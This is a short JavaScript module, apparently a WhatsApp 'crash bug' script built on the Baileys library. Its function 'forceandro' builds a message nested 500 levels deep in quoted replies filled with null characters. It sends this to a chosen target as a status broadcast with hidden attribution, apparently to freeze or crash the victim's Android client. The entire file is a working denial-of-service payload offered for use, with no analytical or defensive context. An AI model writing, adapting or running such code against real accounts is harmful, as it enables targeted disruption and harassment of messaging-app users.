const { generateWAMessageFromContent, proto } = require("@whiskeysockets/baileys");
const crypto = require("crypto");

async function forceandro(sock, target) {
    const buildNested = (depth) => {
        let inner = { conversation: "\0" };
        for (let i = 0; i < depth; i++) {
            inner = {
                extendedTextMessage: {
                    text: "\0",
                    contextInfo: { quotedMessage: inner }
                }
            };
        }
        return inner;
    };

    const payload = {
        extendedTextMessage: {
            text: "\0",
            contextInfo: { quotedMessage: buildNested(500) }
        }
    };

    const msg = generateWAMessageFromContent(
        "status@broadcast",
        {
            [proto.Message.MessageType.STATUS_MESSAGE]: {
                message: payload
            }
        },
        {
            userJid: sock.user.id,
            messageId: crypto.randomBytes(16).toString("hex").toUpperCase(),
            timestamp: Math.floor(Date.now() / 1000),
            quoted: undefined,
            ephemeralExpiration: 0
        }
    );

    await sock.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: { appdata: "default" },
                content: [
                    { tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target } }] },
                    { tag: "status_attribution", attrs: { hidden: "true" }, content: [] }
                ]
            }
        ]
    });
}

module.exports = { forceandro };
